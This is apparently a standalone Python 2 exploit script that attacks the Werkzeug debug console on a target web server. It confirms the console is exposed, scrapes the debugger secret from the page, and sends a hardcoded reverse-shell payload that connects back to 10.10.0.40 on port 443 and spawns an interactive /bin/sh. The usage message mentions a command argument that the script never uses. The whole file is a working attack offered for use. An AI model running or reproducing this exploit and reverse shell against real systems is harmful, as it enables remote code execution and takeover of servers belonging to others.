#!/usr/bin/env python

import requests
import sys
import re
import urllib

if len(sys.argv) != 2:
    print "USAGE: python2 %s <website> <cmd>" % (sys.argv[0])
    sys.exit(-1)

response = requests.get('http://%s/console' % (sys.argv[1]))

if "Werkzeug powered traceback interpreter" not in response.text:
    print "[-] Debug is not enabled"
    sys.exit(-1)

cmd = '''import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.0.40",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'''

response = requests.get('http://%s/console' % (sys.argv[1]))

secret = re.findall("[0-9a-zA-Z]{20}",response.text)

if len(secret) != 1:
    print "[-] Couldn't get the SECRET"
    sys.exit(-1)
else:
    secret = secret[0]
    print "[+] SECRET is: "+str(secret)

raw_input("Press any key to execute")

response = requests.get("http://%s/console?__debugger__=yes&cmd=%s&frm=0&s=%s" % (sys.argv[1],str(cmd),secret))

print "[+] response from server"
print "status code: " + str(response.status_code)
print "response: "+ str(response.text)